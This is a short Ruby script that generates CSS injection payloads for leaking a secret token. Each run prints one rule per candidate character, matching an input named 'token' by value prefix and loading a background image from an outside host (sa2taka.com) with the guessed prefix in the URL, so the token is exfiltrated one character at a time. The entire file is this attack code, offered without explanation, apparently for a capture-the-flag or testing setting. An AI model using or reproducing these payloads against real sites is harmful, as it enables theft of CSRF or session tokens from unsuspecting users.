def gen(t)
   cs = ('a'..'z').to_a.concat(('0'..'9').to_a).concat(['_'])
   cs.each do |c|
       puts "input[name='token'][value^='#{t}#{c}']{background-image: url('http://sa2taka.com?v=#{t}#{c}');}"
   end
end

gen(ARGV[0])
